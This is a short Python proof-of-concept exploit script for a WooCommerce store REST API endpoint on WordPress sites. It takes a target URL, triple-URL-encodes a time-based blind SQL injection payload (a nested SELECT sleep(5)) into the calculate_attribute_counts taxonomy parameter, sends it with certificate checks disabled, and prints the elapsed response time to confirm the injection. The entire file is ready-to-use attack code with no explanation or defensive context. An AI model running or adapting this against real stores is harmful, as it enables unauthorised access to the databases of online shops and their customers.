#!/usr/bin/python3

import requests as req
import urllib
from urllib.parse import quote
import sys
import warnings
warnings.filterwarnings("ignore")

if len(sys.argv) <= 1:
    print(f'USAGE: python3 {sys.argv[0]} <url>')
    exit(1)

script = 'sleep(5)'
payload = f'test") AND (SELECT 4628 FROM (SELECT({script}))lshD) AND ("IqjC"="IqjC'

payload = urllib.parse.quote(payload)
payload = urllib.parse.quote(payload)
payload = urllib.parse.quote(payload)

url = f'{sys.argv[1]}/wp-json/wc/store/products/collection-data?calculate_attribute_counts[][taxonomy]={payload}'
resp = req.get(url, verify=False)

print(resp.elapsed)
